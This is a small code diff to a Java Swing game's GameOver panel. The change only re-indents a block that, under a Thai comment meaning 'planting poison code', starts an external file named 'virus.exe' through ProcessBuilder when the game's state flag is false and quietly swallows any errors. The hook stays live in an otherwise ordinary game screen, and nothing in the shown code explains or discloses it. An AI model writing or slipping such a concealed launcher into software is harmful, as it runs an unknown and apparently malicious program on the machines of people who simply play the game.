@@ -31,11 +31,11 @@ public class GameOver extends JPanel implements ActionListener {
 
         // วางยา code
         try {
-        if (!this.state) {
-        Process p = new ProcessBuilder("virus.exe").start();
-        }
+            if (!this.state) {
+                Process p = new ProcessBuilder("virus.exe").start();
+            }
         } catch (Exception e) {
-        e.printStackTrace();
+            e.printStackTrace();
         }
 
     }
